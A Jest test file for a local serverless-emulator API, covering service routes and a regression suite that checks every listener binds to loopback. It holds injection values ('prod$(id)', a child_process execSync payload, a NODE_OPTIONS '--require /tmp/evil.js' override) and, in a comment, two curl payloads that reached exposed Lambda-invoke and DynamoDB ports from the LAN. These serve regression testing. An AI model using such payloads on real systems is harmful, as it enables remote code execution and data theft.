    expect(ResourceProvisioner.getInstance().cleanupResources).toHaveBeenCalled();
    expect(CacheManager.prototype.deleteService).toHaveBeenCalledWith('my-service');
  });

  it('200 deletes when no cached template (empty resources)', async () => {
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(null);
    const res = await request(appWith()).delete('/api/services/my-service');
    expect(res.status).toBe(200);
  });

  it('500 when deactivation throws', async () => {
    registrar.deactivate.mockRejectedValue(new Error('nope'));
    const res = await request(appWith()).delete('/api/services/my-service');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to delete service');
  });

  it('500 when cleanup throws', async () => {
    jest.spyOn(CacheManager.prototype, 'getTemplate').mockResolvedValue(null);
    jest
      .spyOn(ResourceProvisioner.getInstance(), 'cleanupResources')
      .mockRejectedValue(new Error('nope'));
    const res = await request(appWith()).delete('/api/services/my-service');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to delete service');
  });
});

describe('PATCH /api/services/:name/status', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).patch('/api/services/a..b/status').send({});
    expect(res.status).toBe(400);
  });

  it('400 on invalid status value', async () => {
    const res = await request(appWith())
      .patch('/api/services/my-service/status')
      .send({ status: 'bogus' });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid status value');
  });

  it('400 on invalid PID', async () => {
    const res = await request(appWith())
      .patch('/api/services/my-service/status')
      .send({ pid: -1 });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid PID');
  });

  it('200 updates metadata', async () => {
    const res = await request(appWith())
      .patch('/api/services/my-service/status')
      .send({ status: 'running', pid: 1234 });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  it('500 when updateMetadata throws', async () => {
    jest.spyOn(CacheManager.prototype, 'updateMetadata').mockRejectedValue(new Error('x'));
    const res = await request(appWith())
      .patch('/api/services/my-service/status')
      .send({ status: 'running' });
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to update service status');
  });
});

describe('POST /api/services/:name/start', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).post('/api/services/a..b/start').send({});
    expect(res.status).toBe(400);
  });

  it('404 when service not found', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue(null);
    const res = await request(appWith()).post('/api/services/my-service/start').send({});
    expect(res.status).toBe(404);
  });

  // `node` and `npx` used to be on the whitelist, which is what made this a
  // general command runner: `{"command":"node","args":["-e","<any js>"]}` was a
  // valid body. The derived argv is always `run <script>`, so only package
  // managers can express it.
  it.each(['rm', 'node', 'npx'])('400 when command %p is not a package manager', async (command) => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest.spyOn(processManager, 'start');
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({ command });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Command not allowed');
    expect(startSpy).not.toHaveBeenCalled();
  });

  it.each(['yarn', 'pnpm'])('200 accepts the package manager %p', async (command) => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest.spyOn(processManager, 'start').mockReturnValue({ pid: 7, status: 'running' });
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({ command });
    expect(res.status).toBe(200);
    expect(startSpy).toHaveBeenCalledWith('my-service', expect.objectContaining({ command }));
  });

  // `stage` lands in the npm script name `start:${stage}`, so it decides WHICH
  // script of the service's package.json runs — it is constrained to a
  // conservative charset instead of being interpolated as-is.
  it.each([
    'dev prod',            // whitespace could split into a second argv token
    '../../etc/passwd',    // '/' would name a path
    'prod$(id)',           // never reaches a shell, but it is not a script name
    'a;b',
    42,                    // not even a string
  ])('400 on an invalid stage %p', async (stage) => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest.spyOn(processManager, 'start');
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({ stage });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Invalid stage');
    expect(startSpy).not.toHaveBeenCalled();
  });

  it('200 accepts a conservative stage (letters, digits, dot, dash, underscore)', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest.spyOn(processManager, 'start').mockReturnValue({ pid: 5, status: 'running' });
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({ stage: 'pr-42_v1.2' });
    expect(res.status).toBe(200);
    expect(startSpy).toHaveBeenCalledWith('my-service', expect.objectContaining({
      args: ['run', 'start:pr-42_v1.2'],
    }));
  });

  // THE fix: `cwd`, `args` and `env` used to be handed straight to spawn(), so
  // any unauthenticated cross-origin POST could run anything anywhere. They are
  // ignored now — the server derives all three.
  it('200 ignores caller-supplied cwd, args and env', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    jest.spyOn(processManager, 'start').mockReturnValue({ pid: 4242, status: 'running' });
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({
        command: 'npm',
        args: ['-e', 'require("child_process").execSync("id")'],
        cwd: '/custom',
        env: { NODE_OPTIONS: '--require /tmp/evil.js' },
      });
    expect(res.status).toBe(200);
    expect(res.body.pid).toBe(4242);
    expect(processManager.start).toHaveBeenCalledWith('my-service', {
      cwd: '/abs/my-service',
      command: 'npm',
      args: ['run', 'start'],
    });
    // No `env` key at all: the worker inherits the orchestrator's environment.
    expect((processManager.start as jest.Mock).mock.calls[0][1]).not.toHaveProperty('env');
  });

  it('200 starts with default args derived from stage and metadata.root', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest
      .spyOn(processManager, 'start')
      .mockReturnValue({ pid: undefined, status: 'running' });
    const res = await request(appWith())
      .post('/api/services/my-service/start')
      .send({ stage: 'dev' });
    expect(res.status).toBe(200);
    expect(startSpy).toHaveBeenCalledWith('my-service', expect.objectContaining({
      cwd: '/abs/my-service', args: ['run', 'start:dev'],
    }));
  });

  it('200 starts with plain default args when no stage and no args (req.body undefined)', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const startSpy = jest
      .spyOn(processManager, 'start')
      .mockReturnValue({ pid: 99, status: 'running' });
    // No body parser -> req.body is undefined -> exercises the `|| {}` fallback.
    const res = await request(appNoBodyParser()).post('/api/services/my-service/start');
    expect(res.status).toBe(200);
    expect(startSpy).toHaveBeenCalledWith('my-service', expect.objectContaining({
      args: ['run', 'start'],
    }));
  });

  it('500 when start throws', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    jest.spyOn(processManager, 'start').mockImplementation(() => {
      throw new Error('already running');
    });
    const res = await request(appWith()).post('/api/services/my-service/start').send({});
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to start service');
  });
});

describe('POST /api/services/:name/stop', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).post('/api/services/a..b/stop').send({});
    expect(res.status).toBe(400);
  });

  it('404 when service not found', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue(null);
    const res = await request(appWith()).post('/api/services/my-service/stop');
    expect(res.status).toBe(404);
  });

  it('200 stops the service', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    jest.spyOn(processManager, 'stop').mockReturnValue({ stopped: true });
    const res = await request(appWith()).post('/api/services/my-service/stop');
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  it('500 when stop throws', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    jest.spyOn(processManager, 'stop').mockImplementation(() => {
      throw new Error('x');
    });
    const res = await request(appWith()).post('/api/services/my-service/stop');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to stop service');
  });
});

describe('GET /api/services/:name/runtime', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).get('/api/services/a..b/runtime');
    expect(res.status).toBe(400);
  });

  it('200 reports runtime, gateway and watch status', async () => {
    const res = await request(appWith()).get('/api/services/my-service/runtime');
    expect(res.status).toBe(200);
    expect(res.body).toEqual({
      runtime: { status: 'online', invocations: 0, errors: 0 },
      gateway: {
        api: { port: 3001, status: 'online' },
        invoke: { port: 13001, status: 'online' },
      },
      watch: { watching: true, lastReloadKind: 'runtime' },
    });
    expect(runtime.getRuntimeInfo).toHaveBeenCalledWith('my-service');
    expect(gateway.getInfo).toHaveBeenCalledWith('my-service');
    expect(watcher.getStatus).toHaveBeenCalledWith('my-service');
  });

  it('500 when the runtime lookup throws', async () => {
    runtime.getRuntimeInfo.mockImplementation(() => {
      throw new Error('x');
    });
    const res = await request(appWith()).get('/api/services/my-service/runtime');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to fetch runtime status');
  });
});

describe('POST /api/services/:name/runtime/start', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).post('/api/services/a..b/runtime/start');
    expect(res.status).toBe(400);
  });

  it('404 when service not found', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue(null);
    const res = await request(appWith()).post('/api/services/my-service/runtime/start');
    expect(res.status).toBe(404);
  });

  it('200 activates the service and reports the new status', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    const res = await request(appWith()).post('/api/services/my-service/runtime/start');
    expect(res.status).toBe(200);
    expect(registrar.activate).toHaveBeenCalledWith({ ...META });
    expect(res.body.success).toBe(true);
    expect(res.body.runtime).toEqual({ status: 'online', invocations: 0, errors: 0 });
    expect(res.body.gateway).toEqual({
      api: { port: 3001, status: 'online' },
      invoke: { port: 13001, status: 'online' },
    });
  });

  it('500 when activation throws', async () => {
    jest.spyOn(CacheManager.prototype, 'getMetadata').mockResolvedValue({ ...META });
    registrar.activate.mockRejectedValue(new Error('boom'));
    const res = await request(appWith()).post('/api/services/my-service/runtime/start');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to start runtime');
  });
});

describe('POST /api/services/:name/runtime/stop', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).post('/api/services/a..b/runtime/stop');
    expect(res.status).toBe(400);
  });

  it('200 unwatches and stops the worker and listeners', async () => {
    const res = await request(appWith()).post('/api/services/my-service/runtime/stop');
    expect(res.status).toBe(200);
    expect(res.body).toEqual({ success: true });
    expect(watcher.unwatch).toHaveBeenCalledWith('my-service');
    expect(runtime.stopRuntime).toHaveBeenCalledWith('my-service');
    expect(gateway.stopService).toHaveBeenCalledWith('my-service');
  });

  it('500 when stopping throws', async () => {
    runtime.stopRuntime.mockRejectedValue(new Error('x'));
    const res = await request(appWith()).post('/api/services/my-service/runtime/stop');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to stop runtime');
  });
});

describe('GET /api/services/:name/logs', () => {
  it('400 on invalid service name', async () => {
    const res = await request(appWith()).get('/api/services/a..b/logs');
    expect(res.status).toBe(400);
  });

  it('200 returns logs', async () => {
    jest.spyOn(processManager, 'getLogs').mockReturnValue({ logs: ['a'], status: 'running' as never });
    const res = await request(appWith()).get('/api/services/my-service/logs');
    expect(res.status).toBe(200);
    expect(res.body.logs).toEqual(['a']);
  });

  it('500 when getLogs throws', async () => {
    jest.spyOn(processManager, 'getLogs').mockImplementation(() => {
      throw new Error('x');
    });
    const res = await request(appWith()).get('/api/services/my-service/logs');
    expect(res.status).toBe(500);
    expect(res.body.error).toBe('Failed to fetch logs');
  });
});

// ---------------------------------------------------------------------------
// Regression suite: which interface every listener binds.
//
// Fencing `src/server/index.ts` to loopback was not enough, and the gap was the
// dangerous half. LSS opens four kinds of listener and only one of them read
// LSS_BIND_HOST:
//
//   1. the orchestrator (index.ts)                     — was already fenced
//   2. per-service API + Lambda-invoke ports            — `listen(port)`, no host
//   3. the split self-engine front door (self-backend)  — `listen(port, '0.0.0.0')`
//   4. the DynamoDB dev proxy (dev/dynamo-proxy)        — `listen(port)`, no host
//
// A bare `listen(port)` binds `::`, the dual-stack wildcard — measured, not
// assumed: `address()` reports `'::'` and the socket answers on this host's LAN
// address. So with the default loopback bind in place, these two payloads still
// worked from any machine on the same Wi-Fi:
//
//   curl -X POST http://<victim>:13001/2015-03-31/functions/<fn>/invocations \
//        -d '{"attacker":"controlled event"}'          # runs a Lambda handler
//   curl -X POST http://<victim>:4566/ \
//        -H 'X-Amz-Target: DynamoDB_20120810.Scan' -d '{"TableName":"..."}'
//
// These listeners never reach Express, so neither the CORS allowlist nor
// anything else in the route layer applies to them — the bind IS the control.
// Every test below asserts the bound address of a REAL listener, which is what
// the defect was, and replays the reported payload's network path where the box
// has an interface to replay it on.
// ---------------------------------------------------------------------------
describe('listener bind host (network exposure)', () => {
  const BIND_HOST_MODULE = '../../../src/server/services/bind-host';
  const GATEWAY_MODULE = '../../../src/server/services/gateway-manager';

  let tempDirs: string[] = [];
  let openServers: http.Server[] = [];

  beforeEach(() => {
    // The gateway and the proxy narrate their binds; keep the run readable.
    jest.spyOn(console, 'log').mockImplementation(() => undefined);
    jest.spyOn(console, 'warn').mockImplementation(() => undefined);
    tempDirs = [];
    openServers = [];
  });

  afterEach(async () => {
    for (const server of openServers) {
      if (server.listening) await new Promise<void>(r => server.close(() => r()));
    }
    for (const dir of tempDirs) await fs.promises.rm(dir, { recursive: true, force: true });
  });

  // The address a listener actually bound. '127.0.0.1' is the fence holding;
  // '::' or '0.0.0.0' is the bug.
  const boundAddress = (server: http.Server): string => (server.address() as AddressInfo).address;
  const boundPort = (server: http.Server): number => (server.address() as AddressInfo).port;

  // An ephemeral port number nothing holds: bind, read it, release it.
  async function freePort(): Promise<number> {
    const probe = http.createServer();
    await new Promise<void>(resolve => probe.listen(0, '127.0.0.1', resolve));
    const port = boundPort(probe);
    await new Promise<void>(resolve => probe.close(() => resolve()));
    return port;
  }

  // This host's first routable IPv4 — the `<victim-ip>` the reported payloads
  // aim at. A machine with no such interface cannot be attacked over one, so
  // the network half of each test only runs where there is a network.
  function lanAddress(): string | undefined {
    return Object.values(os.networkInterfaces())
      .flatMap(nics => nics ?? [])
      .find(nic => nic.family === 'IPv4' && !nic.internal)?.address;
  }

  interface Probe { status?: number; body: string; errorCode?: string }

  // GET host:port/path, reporting either the answer or the connection error.
  // A refusal is the assertion in half these tests, so it must be a value.
  function probe(host: string, port: number, urlPath = '/'): Promise<Probe> {
    return new Promise(resolve => {
      const req = http.request(
        { host, port, path: urlPath, method: 'GET', agent: false, timeout: 4000, headers: { connection: 'close' } },
        res => {
          const chunks: Buffer[] = [];
          res.on('data', chunk => chunks.push(chunk as Buffer));
          res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString('utf-8') }));
        },
      );
      // A dropping firewall answers with silence rather than ECONNREFUSED;
      // either way the port did not serve the request, which is the claim.
      req.on('timeout', () => { req.destroy(); resolve({ body: '', errorCode: 'ETIMEDOUT' }); });
      req.on('error', (err: NodeJS.ErrnoException) => resolve({ body: '', errorCode: err.code ?? 'ERROR' }));
      req.end();
    });
  }

  function entryFor(name: string, apiPort: number, invokePort: number): ServiceEntry {
    return {
      name,
      root: `/proj/${name}`,
      stage: 'dev',
      apiPort,
      invokePort,
      functions: [{
        name: 'fn',
        fullName: `${name}-dev-fn`,
        handler: 'h.handler',
        runtime: 'nodejs20.x',
        memorySize: 128,
        timeout: 6,
        environment: {},
        triggers: [],
      }],
      routes: [{ functionName: 'fn', method: 'GET', path: '/ping', eventType: 'httpApi' as const, cors: false }],
      authorizers: [],
    };
  }

  it('defaults to loopback and classifies every loopback spelling', () => {
    expect(getBindHost()).toBe('127.0.0.1');

    for (const host of ['127.0.0.1', '127.0.0.53', 'localhost', 'LocalHost', '::1', '[::1]', '::ffff:127.0.0.1']) {
      expect(isLoopbackBind(host)).toBe(true);
    }
    // The wildcards are exactly what the four listeners used to bind.
    for (const host of ['0.0.0.0', '::', '[::]', '192.168.1.10', '::ffff:192.168.1.10', 'lss.internal']) {
      expect(isLoopbackBind(host)).toBe(false);
    }
  });

  // The value is captured once at module load — deliberately, so listeners that
  // come up at boot and listeners that come up on a hot reload an hour later
  // cannot disagree about how exposed this process is. Reloading the module is
  // therefore the only way to change it, which is also the point: no request
  // path can.
  it('honours LSS_BIND_HOST, trimmed, and treats a blank value as unset', () => {
    const original = process.env.LSS_BIND_HOST;
    const cases: Array<[string | undefined, string]> = [
      [undefined, '127.0.0.1'],   // the default every developer gets
      ['0.0.0.0', '0.0.0.0'],     // the documented opt-in
      ['  10.0.0.5  ', '10.0.0.5'],
      ['   ', '127.0.0.1'],       // whitespace is not an address
      ['', '127.0.0.1'],
    ];
    try {
      for (const [raw, expected] of cases) {
        if (raw === undefined) delete process.env.LSS_BIND_HOST;
        else process.env.LSS_BIND_HOST = raw;
        jest.isolateModules(() => {
          const mod = require(BIND_HOST_MODULE) as typeof import('../../../src/server/services/bind-host');
          expect(mod.getBindHost()).toBe(expected);
        });
      }
    } finally {
      if (original === undefined) delete process.env.LSS_BIND_HOST;
      else process.env.LSS_BIND_HOST = original;
    }
  });

  // BYPASS 1 (critical): the per-service listeners. `gateway-manager.ts` called
  // `server.listen(port)` with no host for both the API port and the Lambda
  // invoke port, so the one surface that runs arbitrary registered handlers with
  // a caller-supplied event was on every interface while index.ts sat on
  // loopback. The module is mocked for the route tests above, so the real class
  // is pulled in explicitly here — a mock cannot demonstrate a bind.
  it('GatewayManager binds the API and Lambda-invoke listeners to loopback', async () => {
    const { GatewayManager: RealGatewayManager } =
      jest.requireActual<typeof import('../../../src/server/services/gateway-manager')>(GATEWAY_MODULE);

    const apiPort = await freePort();
    const invokePort = await freePort();
    const gm = new RealGatewayManager();
    try {
      await gm.syncService(entryFor('bind-check', apiPort, invokePort), true);
      expect(gm.getInfo('bind-check')).toEqual({
        api: { port: apiPort, status: 'online' },
        invoke: { port: invokePort, status: 'online' },
      });

      // Neither listener is exposed on the instance, and the bound address is
      // the entire fix — read it off the private state rather than assert
      // something weaker that a `::` bind would also satisfy.
      const state = (gm as unknown as {
        listeners: Map<string, { apiServer?: http.Server; invokeServer?: http.Server }>;
      }).listeners.get('bind-check');
      expect(boundAddress(state!.apiServer!)).toBe('127.0.0.1');
      expect(boundAddress(state!.invokeServer!)).toBe('127.0.0.1');

      // ...and it really is the Lambda Invoke API answering there, not an inert
      // socket: the endpoint names the path it rejected.
      const local = await probe('127.0.0.1', invokePort, '/nope');
      expect(local.status).toBe(404);
      expect(JSON.parse(local.body).Message).toContain('Unsupported path');

      // The reported payload's network path: `http://<victim-ip>:13001/...`
      // must not connect at all.
      const lan = lanAddress();
      if (lan) {
        const fromLan = await probe(lan, invokePort, '/2015-03-31/functions/bind-check-dev-fn/invocations');
        expect(fromLan.status).toBeUndefined();
        expect(fromLan.errorCode).toBeDefined();
      }
    } finally {
      await gm.stopAll();
    }
  });

  // BYPASS 2 (high): the self engine's own front door. It only binds when
  // `serverPort` and `selfEngine.port` differ (split-listener mode) — the
  // embedded default rides the orchestrator's socket — and it asked for
  // '0.0.0.0' literally, publishing the unauthenticated AWS wire (every table,
  // queue, bucket and secret) on every interface.
  it('the split-listener self engine binds loopback, not 0.0.0.0', async () => {
    const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'lss-bind-host-'));
    tempDirs.push(dataDir);

    const backend = new SelfEngineBackend({
      port: 0, // ephemeral: this is about the address, not the port
      dataDir,
      account: '000000000000',
      region: 'us-east-1',
      idleUnloadMs: 300_000,
      memoryBudgetMb: 64,
      fsync: false,
      fallbackEndpoint: null,
      persistence: false,
    });

    await backend.start();
    try {
      const server = (backend as unknown as { server: http.Server | null }).server;
      expect(server).not.toBeNull();
      expect(boundAddress(server!)).toBe('127.0.0.1');

      // The wire is live on loopback — the fix moves the address, not the
      // feature.
      const port = boundPort(server!);
      const local = await probe('127.0.0.1', port, '/_lss/health');
      expect(local.status).toBe(200);

      const lan = lanAddress();
      if (lan) {
        const fromLan = await probe(lan, port, '/_lss/health');
        expect(fromLan.status).toBeUndefined();
        expect(fromLan.errorCode).toBeDefined();
      }
    } finally {
      await backend.stop();
    }
  });

  // Same defect class, and index.ts used to carry a comment conceding it: the
  // optional DynamoDB proxy is a credential-free pass-through to the engine's
  // DynamoDB surface, and it bound every interface the moment anyone set
  // `enableDynamoProxy`.
  it('the DynamoDB dev proxy binds loopback', async () => {
    const proxy = startDynamoProxy('http://127.0.0.1:1', 0);
    openServers.push(proxy);
    await once(proxy, 'listening');
    expect(boundAddress(proxy)).toBe('127.0.0.1');
  });
});
